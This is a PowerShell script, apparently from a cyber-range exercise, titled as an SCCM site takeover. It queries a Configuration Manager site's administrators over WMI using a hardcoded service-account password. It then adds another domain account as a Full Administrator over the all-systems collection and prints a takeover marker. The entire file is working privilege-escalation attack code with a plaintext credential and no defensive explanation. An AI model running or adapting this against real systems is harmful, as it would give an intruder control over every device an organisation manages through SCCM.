# SCCM site takeover - documented WMI method (sccm-integration-guide Phase 7.5)
$ErrorActionPreference = "Continue"
$user = "range.local\svc_sccm"
$pass = "s3rv1c3_SCCM!"
$cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
$ns = "root\SMS\site_CAD"

Write-Output "=== current admins ==="
try {
  $admins = Get-WmiObject -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_Admin" -Credential $cred -ErrorAction Stop
  $admins | ForEach-Object { Write-Output "ADMIN: $($_.LogonName) AdminSid=$($_.AdminSID)" }
} catch { Write-Output "query err: $($_.Exception.Message)" }

Write-Output "=== add RANGE\\svc_naa as Full Admin (documented method) ==="
try {
  $sid = ([System.Security.Principal.NTAccount]"RANGE\svc_naa").Translate([System.Security.Principal.SecurityIdentifier]).Value
  Write-Output "svc_naa SID: $sid"
  $scope = New-Object System.Management.ManagementScope("\\mbr02.range.local\$ns")
  $scope.Connect()
  $class = New-Object System.Management.ManagementClass($scope, "SMS_Admin", $null)
  $admin = $class.CreateInstance()
  $admin["AdminSid"] = $sid
  $admin["AdminType"] = 1
  $admin["CategoryType"] = 1
  $admin["CollectionID"] = "SMS00001"
  $admin["RoleName"] = @("Full Administrator")
  $admin.Put() | Out-Null
  Write-Output "ADD_OK"
} catch { Write-Output "add err: $($_.Exception.Message)" }

Write-Output "=== re-query admins ==="
try {
  $admins = Get-WmiObject -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_Admin" -Credential $cred -ErrorAction Stop
  $admins | ForEach-Object { Write-Output "ADMIN: $($_.LogonName) AdminSid=$($_.AdminSID)" }
} catch { Write-Output "re-query err: $($_.Exception.Message)" }
Write-Output "=== TAKEOVER_DONE ==="
